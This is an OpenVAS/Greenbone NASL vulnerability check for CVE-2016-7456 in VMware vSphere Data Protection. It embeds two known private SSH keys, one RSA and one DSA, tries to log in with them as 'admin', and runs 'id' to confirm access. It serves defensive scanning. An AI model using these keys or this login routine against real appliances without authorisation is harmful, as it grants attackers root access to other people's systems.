# SPDX-FileCopyrightText: 2016 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.140104");
  script_cve_id("CVE-2016-7456");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_version("2023-06-28T05:05:21+0000");
  script_name("VMware vSphere Data Protection (VDP) updates address SSH Key-Based authentication issue (VMSA-2016-0024, dpnid) - Active Check");

  script_xref(name:"URL", value:"http://www.vmware.com/security/advisories/VMSA-2016-0024.html");

  script_tag(name:"vuldetect", value:"Try to login with a known private SSH key.");

  script_tag(name:"solution", value:"Apply the update from the referenced vendor advisory.");

  script_tag(name:"summary", value:"VMware vSphere Data Protection (VDP) updates address SSH key-based authentication issue.");

  script_tag(name:"insight", value:"VDP contains a private SSH key with a known password that is configured to allow key-based
  authentication. Exploitation of this issue may allow an unauthorized remote attacker to log into the appliance with root privileges.");

  script_tag(name:"affected", value:"VDP 6.1.x, 6.0.x, 5.8.x, 5.5.x.");

  script_tag(name:"last_modification", value:"2023-06-28 05:05:21 +0000 (Wed, 28 Jun 2023)");
  script_tag(name:"severity_vector", value:"CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_tag(name:"severity_origin", value:"NVD");
  script_tag(name:"severity_date", value:"2017-01-03 18:43:00 +0000 (Tue, 03 Jan 2017)");
  script_tag(name:"creation_date", value:"2016-12-28 11:04:22 +0100 (Wed, 28 Dec 2016)");
  script_tag(name:"qod_type", value:"exploit");
  script_tag(name:"solution_type", value:"VendorFix");
  script_category(ACT_ATTACK);
  script_family("General");
  script_copyright("Copyright (C) 2016 Greenbone AG");
  script_dependencies("ssh_detect.nasl", "gb_default_credentials_options.nasl");
  script_require_ports("Services/ssh", 22);
  script_mandatory_keys("ssh/server_banner/available");
  script_exclude_keys("default_credentials/disable_default_account_checks");

  exit(0);
}

# If optimize_test = no
if(get_kb_item("default_credentials/disable_default_account_checks"))
  exit(0);

include("ssh_func.inc");
include("misc_func.inc");
include("port_service_func.inc");

port = ssh_get_port(default:22);

if(ssh_dont_try_login(port:port))
  exit(0);

keys = make_list(
'-----BEGIN RSA PRIVATE KEY-----
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
-----END RSA PRIVATE KEY-----',
'-----BEGIN DSA PRIVATE KEY-----
MIIBuwIBAAKBgQCWUMSv1kpW6ekyej2CaRNn4uX0YJ1xbzp7s0xXgevU+x5GueQS
mS+Y+DCvN7ea2MOupF9n77I2qVaLuCTZo1bUDWgHFAzc8BIRuxSa0/U9cVUxGA+u
+BkpuepaWGW4Vz5eHIbtCuffZXlRNcTDNrqDrJfKSgZW2EjBNB7vCgb1UwIVANlk
FYwGnfrXgyXiehj0V8p9Mut3AoGANktxdMoUnER7lVH1heIMq6lACWOfdbltEdwa
/Q7OeuZEY434C00AUsP2q6f9bYRCdOQUeSC5hEeqb7vgOe/3HN02GRH7sPZjfWHR
/snADZsWvz0TZQuybs8dEdGh/ezGhiItCINFkVg7NvSXx85dMVsB5N9Ju0gDsZxW
/d41VXYCgYBH0zIlb3lvioedyZj2mKF6fycnCZIeeDnL8wZtZPStRht6i4PFTCX1
Y/Ogw0L0bhuthOx+VTgICB87r0TmXElNUDLSncsxuw7pmHa669idUkv43CjeDkH0
kGFEHt4QA6/xw1Xq9oNpRJTo62ZsFmv0Pwp3uE7up8s0LW1O6fr+OwIVAKCJZ8nm
UwIdhEc9aU7sBDTFijP+
-----END DSA PRIVATE KEY-----');

user = "admin";

foreach key( keys )
{
  if( ! soc = open_sock_tcp( port ) )
    continue;

  login = ssh_login( socket:soc, login:user, password:NULL, priv:key, passphrase:NULL );
  if( login == 0 )
  {
    cmd = "id";
    res = ssh_cmd( socket:soc, cmd:cmd );
    close( soc );
    if( res =~ "uid=[0-9]+.*gid=[0-9]+" )
    {
      security_message( port:port, data:'It was possible to login as user "' + user + '" using a known SSH private key without any passphrase and to execute the "' + cmd + '" command. Result:\n\n' + res);
      exit( 0 );
    }
    exit( 0 );
  }

  if( soc ) close( soc );
}

exit( 99 );
